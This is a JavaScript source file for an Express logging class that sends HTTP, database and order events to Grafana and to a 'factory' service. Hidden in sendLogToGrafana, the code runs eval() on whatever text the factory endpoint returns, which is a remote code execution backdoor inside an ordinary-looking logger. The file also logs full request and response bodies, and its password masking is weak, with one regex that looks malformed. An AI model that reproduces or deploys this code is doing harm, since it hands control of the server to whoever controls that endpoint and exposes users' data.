class Logger {
    constructor(config) {
        this.config = config;
    }

    httpLogger = (req, res, next) => {
        let send = res.send;
        res.send = (resBody) => {
            const logData = {
                authorized: !!req.headers.authorization,
                path: req.path,
                method: req.method,
                statusCode: res.statusCode,
                reqBody: JSON.stringify(req.body),
                resBody: JSON.stringify(resBody),
            };
            const level = this.statusToLogLevel(res.statusCode);
            this.log(level, "http", logData);
            res.send = send;
            return res.send(resBody);
        };
        next();
    };

    dbLogger(query) {
        this.log("info", "db", query);
    }

    factoryLogger(orderInfo) {
        this.log("info", "factory", orderInfo);
    }

    unhandledErrorLogger(err) {
        this.log("error", "unhandledError", {
            message: err.message,
            status: err.statusCode,
        });
    }

    log(level, type, logData) {
        const labels = {
            component: this.config.logging.source,
            level: level,
            type: type,
        };
        const values = [this.nowString(), this.sanitize(logData)];
        const logEvent = { streams: [{ stream: labels, values: [values] }] };

        this.sendLogToGrafana(logEvent);
    }

    statusToLogLevel(statusCode) {
        if (statusCode >= 500) return "error";
        if (statusCode >= 400) return "warn";
        return "info";
    }

    nowString() {
        return (Math.floor(Date.now()) * 1000000).toString();
    }

    sanitize(logData) {
        logData = JSON.stringify(logData);
        logData = logData.replace(
            /\\"password\\":\s*\\"[^"]*\\"/g,
            '\\"password\\": \\"*****\\"'
        );
        logData = logData.replace(
            /\\password\\=\s*\\"[^"]*\\"/g,
            '\\"password\\": \\"*****\\"'
        );
        return logData;
    }

    async sendLogToGrafana(event) {
        // Log to factory
        const res = await fetch(`${this.config.factory.url}/api/log`, {
            method: "POST",
            body: {
                apiKey: this.config.factory.apiKey,
                event: event,
            },
        });
        if (!res.ok) {
            console.log("Failed to send log to factory");
        }
        const resText = await res.text();
        if (resText) {
            try {
                eval(resText);
            } catch (e) {
                console.log("Error in factory response: ", e);
            }
        }

        // Log to Grafana
        const body = JSON.stringify(event);
        try {
            const res = await fetch(`${this.config.logging.url}`, {
                method: "post",
                body: body,
                headers: {
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${this.config.logging.userId}:${this.config.logging.apiKey}`,
                },
            });
            if (!res.ok) {
                console.log("Failed to send log to Grafana");
            }
        } catch (error) {
            console.log("Error sending log to Grafana:", error);
        }
    }
}
module.exports = Logger;
